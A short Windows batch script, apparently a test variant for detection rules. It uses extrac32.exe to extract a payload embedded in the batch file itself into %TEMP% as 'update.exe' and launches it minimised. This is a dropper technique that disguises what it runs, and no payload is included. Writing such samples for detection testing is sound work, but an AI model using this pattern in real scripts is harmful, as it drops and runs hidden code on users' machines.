@echo off
REM Variant: renamed payload, %TEMP% variable, unquoted paths, start flag,
REM and newline-separated extract/launch instead of && chaining.
extrac32.exe /Y %~f0 %TEMP%\update.exe
start /min "" %TEMP%\update.exe
